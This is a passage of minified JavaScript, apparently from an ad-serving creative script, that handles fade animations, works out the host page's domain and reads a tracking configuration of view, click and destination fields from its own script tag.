        4 === a && (e[17] = h = 0 < e[16] ? (f - e[15]) / e[16] : 1, 1 <= h ? (h = 1, e[14] = !1) : h = .5 - Math.cos(h * Math.PI) / 2, m = h);
        k.opacity = m;
        e[14] ? e[18] = ma(ze, 5, a, b, !0) : b || Hc(a);
      } catch (l) {}
    },
    ig = function (a) {
      try {
        var b = ea[a];
        var c = D[a][1].style;
        b[14] && (b[14] = !1, sa(b[18]));
        c.opacity = "1";
      } catch (d) {}
    };
  (function () {
    var a, b;
    Nb = Ea();
    mc = na.length + "." + Math.random().toString().substr(2, 6) + "." + Nb;
    var c;
    try {
      Ua = top.location.href;
    } catch (h) {
      var d = self.location;
      var e = d.ancestorOrigins;
      u.parent === top && C.referrer ? Ua = C.referrer : "object" === typeof F && /^http/i.test(F.host) ? (Ua = F.host, /tpc.google/.test(d.host) && (Ua = Ua.replace(/^.*?:/, d.protocol))) : Ua = e && 0 < (c = e.length) ? e[c - 1] : d.href;
    }
    Ua ? (Ua.replace(/\/\/.*/, "//"), Ta = Ua.replace(/^https?:\/\/([^\/:]+).*/i, "$1"), /\.ampproject\./i.test(Ta) && (Ta = "unknown.ampproject.net")) : Ta = "unknown";
    /^data:/.test(Ta) && (Ta = "unknown");
    var g, f;
    d = C.currentScript;
    if (!d) {
      e = RegExp("/F\\W1723574\\W", "i");
      c = C.getElementsByTagName("script");
      for (f = 0; f < c.length; f++) {
        var k = c[f];
        if (!k.getAttribute("ccinuse")) if ("ccfid1723574" === k.getAttribute("id")) {
          d = k;
          break;
        } else !g && e.test(k.getAttribute("src")) && (g = k);
      }
      d || (d = g);
    }
    d && d.setAttribute("ccinuse", "1");
    Ca = Ba = d;
    if (!F) try {
      if (a = Ba && Ba.getAttribute("ccex")) F = JSON.parse(decodeURIComponent(a)), u.cc1723574 = F;
    } catch (h) {}
    F && "object" === typeof F || (F = {});
    "string" === typeof F.view ? F.view = [F.view] : F.view && F.view.concat || (F.view = []);
    if ("object" === typeof va && va) for (b in va.view && (F.view = F.view.concat(va.view)), va.click && (va.click.join && (va.click = va.click.join("")), F.click !== va.click && (F.click = Vb(F.click) + Vb(va.click))), je(va.dest) && (F.dest = va.dest), va) va.hasOwnProperty(b) && (/^(view|click|dest)$/.test(b) || (F[b] = va[b]));
    Nf(0);
  })();
})();